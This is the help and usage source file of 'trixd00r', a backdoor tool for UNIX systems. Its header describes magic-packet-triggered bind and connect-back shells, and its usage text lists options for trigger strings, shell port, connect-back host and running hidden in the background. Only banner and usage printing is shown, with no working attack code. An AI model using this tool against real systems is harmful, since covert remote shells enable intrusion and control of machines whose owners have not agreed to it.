/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * server/src/help.c                                                           *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#include "help.h"
#include "trixd00rd.h"


/* leet banner */
void banner()
{
    printf("+------------------------------------------+\
           \n| trixd00rd - http://www.nullsecurity.net/ |\
           \n+------------------------------------------+\n");

    return;
}


/* help and usage */
void usage()
{
    printf("usage:\n\n\
  trixd00rd -i <arg> [options]\n\
    \noptions:\n\n\
  -i <iface>    - interface to use\n\
  -t <type>     - magic packet type - ? to list all (default TCP SYN)\n\
  -p <payload>  - magic payload string to trigger shell (default opensesame)\n\
  -s <mode>     - shell mode - ? to list all (default TCP bind port)\n");
    printf("  -b <port>     - port for shell (default 31337)\n\
  -a <host>     - allow only this host to talk to trixd00rd (default ANY)\n\
  -c <host>     - connect back host\n\
  -z <payload>  - magic payload string to quit trixd00rd (default byebye)\n\
  -d            - daemonize trixd00rd and put in background\n\
  -n            - send no welcome and bye banner\n");
    printf("  -x            - use ssl (only available in priv8 version!)\n\
  -v            - verbose mode (default quiet)\n\
  -V            - show trixd00rd version\n\
  -H            - show help and usage\n");
    
    return;
}

/* EOF */
